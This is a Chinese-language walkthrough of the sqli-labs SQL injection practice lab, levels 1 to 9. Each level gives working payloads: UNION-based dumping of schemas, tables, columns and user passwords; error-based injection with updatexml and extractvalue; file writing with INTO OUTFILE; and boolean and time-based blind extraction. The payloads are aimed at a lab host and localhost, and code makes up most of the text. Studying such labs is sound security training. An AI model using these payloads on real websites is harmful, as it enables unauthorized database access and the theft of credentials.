##### union联合查询步骤：

###### 判断注入点

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=1 and 1=1
and两边都为真，回显正常，有数据
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=1 and 1=2
and一边为真一边为假，回显异常，无数据
```

###### 构造闭合(字符型)

```sql
①在URL链接中附加字符串' -- s即http://xxx.xxx.xxx/abc.php?p=YY' -- s        
//判断是否为字符型

②在URL链接中附加字符串' -- s即
http://xxx.xxx.xxx/abc.php?p=YY' and 1=1 -- s        //结果返回正常

③在URL链接中附加字符串' -- s即
http://xxx.xxx.xxx/abc.php?p=YY' and 1=2 -- s        //结果返回异常
则通过①②③判断出为字符型

常用构造闭合符号：
单引号' 双引号" 单引号+括号') 双引号+括号")

常用注释符号:
--空格（经常会在其后面加上一个任意字母区分括号eg：-- s）
```

###### 判断字段数量

```sql
order by：排序  
注意：如果是数字型注入，也有必要加上注释 # 或者 --空格，因为，在数据传递的时候，不知道
order by后面是否跟了其他语句
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=1 order by 3
判断字段数量，返回正常，说明至少存在3个字段
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=1 order by n
返回异常，说明不存在n列
```

###### union联合查询，判断回显点

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=1 union select 1,2,3
```

###### 爆数据

```sql
user()   database()   version()
```

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php?id=-1  
#-1是让前面的代码失效（不占回显位） 好执行后面我们想要执行的爆库语句（）
union select 1,user(),database()
```

###### 爆所有库名

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php
?id=-1 union select 1,user(),group_concat(schema_name)
 from information_schema.schemata
```

###### 爆security库名中的所有表名

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php
?id=-1 union select 1,2, group_concat(TABLE_NAME)
 from information_schema.TABLES WHERE TABLE_SCHEMA=database();
```

###### 爆security库名中users表中的所有字段

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php
?id=-1 union select 1,2, group_concat(column_name)
 from information_schema.columns
 WHERE TABLE_SCHEMA=database() and table_name="users"
```

###### 爆users表中的用户，密码

```sql
http://sss-s347qh.gxalabs.com/Pass-01/index.php
?id=-1 union select 1,group_concat(username), group_concat(password)
from users
```

##### 第1关

类型：字符型 

构造闭合符号：`'`

payload：`?id=-1' union select 1,2,database() -- s `

##### 第2关

类型：数字型

payload：`?id=-1 union select 1,2,database() -- s`

##### 第3关

类型：字符型 

构造闭合符号：单引号`'`+括号`)`

payload：`?id=-1') union select 1,2,database() -- s`

##### 第4关

类型：字符型

构造闭合符号：双引号`"`+括号`)`

payload：`?id=-1") union select 1,2,database() -- s`

##### 第5关

类型：字符型+报错注入

报错函数：updatexml、extractvalue

构造闭合符号：单引号`'`

payload1：

```sql
?id=1' and updatexml('1',concat("~~",(database())),'9') -- s
注意：
①在concat函数中，我们的查询语句应用括号括在一起  (database())
```

payload2：

```sql
?id=1' and extractvalue('1',concat("~~",(database()))) -- s
```

##### 第6关

类型：字符型+报错注入

报错函数：updatexml、extractvalue

构造闭合符号：双引号`"`

payload1：

```sql
?id=1" and extractvalue('1',concat("~~",(database()))) -- s
```

payload2:

```sql
?id=1" and updatexml('1',concat("~~",(database())),'9') -- s
```

##### 第7关(不常见)

类型：字符型+into outfile

```textile
into outfile 语句用于把表数据导出到一个文本文件中 
条件：
1)要有file_priv权限

2)知道网站绝对路径

3)要能用union

4)对web目录有写权限

5)没有过滤单引号 
```

构造闭合字符：`'))`

payload：

```sql
?id=1')) union select 1,2,database() into outfile  "F:/res.txt" -- s
注意：
"F:/res.txt" 为文件输出路径 且当前路径没有该文件
```

![](G:\Roaming\marktext\images\图1-sql.png)

##### 第8关

类型：字符型+布尔盲注

构造闭合符号：`'`

###### 流程

1. 首先判断注入点，既不能联合也不能报错

2. 尝试布尔盲注，首先判断当前数据库长度
   
   ```sql
   二分法判断长度
   http://localhost:7036/sqli-labs/Less-8/?id=1' and 
   length(database())>10 -- s    //返回false  0-10
   
   http://localhost:7036/sqli-labs/Less-8/?id=1' and 
   length(database())>5 -- s     //返回true   5-10
   
   http://localhost:7036/sqli-labs/Less-8/?id=1' and 
   length(database())>7 -- s     //返回true   7-10
   
   http://localhost:7036/sqli-labs/Less-8/?id=1' and 
   length(database())>8 -- s //返回false
   
   http://localhost:7036/sqli-labs/Less-8/?id=1' and 
   length(database())=8 -- s //返回true 确定长度为8
   ```

3. 判断库名具体字符
   
   ```sql
   判断第1个字符（二分法，依次判断ascii码（33-127）） 方法与步骤2一致
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and ascii(substr(database(),1,1))=115 -- s
   判断第2个字符
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and ascii(substr(database(),2,1))=115 -- e 
   ... ...
   直到判断库名为8个字符的security
   ```

4. 判断表长度（方法同上 二分法）
   
   ```sql
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and length((select table_name from 
   information_schema.tables 
   where table_schema=database() limit 0,1))=6 -- s  (例子：emails)
   
   #limit 0,1 限制此时判断的为第1个表
   #limit 1,1 限制此时判断的为第2个表
   
   ... ...依此类推
   ```

5.   判断表名具体字符（方法同上 二分法 判断ascii码）
   
   ```sql
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and ascii(substr((select table_name from 
   information_schema.tables where 
   table_schema=database() limit 0,1),1,1))=101 -- s  #(e)
                              ||    ||
                           第1个表  第一个字符
   
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and ascii(substr((select table_name from 
   information_schema.tables where 
   table_schema=database() limit 0,1),2,1))=101 -- s  #(m)
   
   ...  ...
   直到找到所有表以及表名   或者想要的用户表
   ```

6. 找到想要的表以及字段（方法同上）后，获取内容
   
   ```sql
   users表为例  字段为username  数据为Dumb
   #判断数据长度
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and length((select username from users limit 0,1))=4 -- s
   #limit 0,1 表示第1条数据
   #limit 1,1 表示第2条数据
   ... ...
   
   #判断内容
   http://localhost:7036/sqli-labs/Less-8/
   ?id=1' and ASCII(substr((select username from 
   users limit 0,1),1,1))=68 -- s
                  ||
                 第一个字符=68  =》D   
   ... ...
   依此类推 第一条数据为  Dumb
   直到判断出username字段所有数据
   ```

##### 第9关

类型：字符型+时间盲注

构造闭合符号：单引号`'`

###### 流程

1. 首先判断注入点，既不能联合也不能报错

2. 尝试布尔盲注，首先判断当前数据库长度
   
   ```sql
   二分法判断长度
   http://localhost:7036/sqli-labs/Less-9/?id=1' and 
   if((length(database())>10),sleep(2),1) -- s    //直接返回  0-10
   
   http://localhost:7036/sqli-labs/Less-9/?id=1' and 
   if((length(database())>5),sleep(2),1) -- s     //延时2秒   5-10
   
   http://localhost:7036/sqli-labs/Less-9/?id=1' and 
   if((length(database())>7),sleep(2),1) -- s     //延时2秒   7-10
   
   http://localhost:7036/sqli-labs/Less-9/?id=1' and 
   if((length(database())>8),sleep(2),1) -- s //直接返回
   
   http://localhost:7036/sqli-labs/Less-9/?id=1' and 
   if((length(database())=8),sleep(2),1) -- s //延时2秒 确定长度为8
   ```

3. 判断库名具体字符
   
   ```sql
   判断第1个字符（二分法，依次判断ascii码（33-127）） 方法与步骤2一致
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((ascii(substr(database(),1,1))=115),sleep(2),1) -- s
   判断第2个字符
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((ascii(substr(database(),2,1))=115),sleep(2),1) -- e 
   ... ...
   直到判断库名为8个字符的security
   ```

4. 判断表长度（方法同上 二分法）
   
   ```sql
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((length((select table_name from 
   information_schema.tables 
   where table_schema=database() limit 0,1))=6),sleep(2),1) -- s  (例子：emails)
   
   #limit 0,1 限制此时判断的为第1个表
   #limit 1,1 限制此时判断的为第2个表
   
   ... ...依此类推
   ```

5.   判断表名具体字符（方法同上 二分法 判断ascii码）
   
   ```sql
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((ascii(substr((select table_name from 
   information_schema.tables where 
   table_schema=database() limit 0,1),1,1))=101),sleep(2),1) -- s  #(e)
                            ||    ||
                         第1个表  第一个字符
   
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((ascii(substr((select table_name from 
   information_schema.tables where 
   table_schema=database() limit 0,1),2,1))=101),sleep(2),1) -- s  #(m)
   
   ...  ...
   直到找到所有表以及表名   或者想要的用户表
   ```

6. 找到想要的表以及字段（方法同上）后，获取内容
   
   ```sql
   users表为例  字段为username  数据为Dumb
   #判断数据长度
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((length((select username 
   from users limit 0,1))=4),sleep(2),1) -- s
   #limit 0,1 表示第1条数据
   #limit 1,1 表示第2条数据
   ... ...
   
   #判断内容
   http://localhost:7036/sqli-labs/Less-9/
   ?id=1' and if((ASCII(substr((select username from 
   users limit 0,1),1,1))=68),sleep(2),1) -- s
                ||
               第一个字符=68  =》D   
   ... ...
   依此类推 第一条数据为  Dumb
   直到判断出username字段所有数据
   ```
